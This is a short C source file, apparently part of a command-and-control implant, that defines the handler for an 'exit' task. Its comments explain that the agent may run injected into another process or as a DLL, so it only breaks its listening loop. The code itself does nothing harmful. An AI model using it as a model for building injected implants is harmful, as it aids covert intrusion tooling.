#include "Tasks/Exit.h"

#include "Parser.h"
#include "Task.h"
#include <processthreadsapi.h>

DWORD Exit(PCHAR taskUuid, PPARSER arguments)
{
    PackageComplete(taskUuid, NULL);
    // this will kill the whole process if an agent is injected into it, although the agent is only running as a thread
    // so just pipe-through that the agent should exit and break the infinite listening loop in main.c instead
    // NB: This might require cleanup when injected as DLL
    //ExitProcess(0);
    return TASK_STATUS_EXIT;
}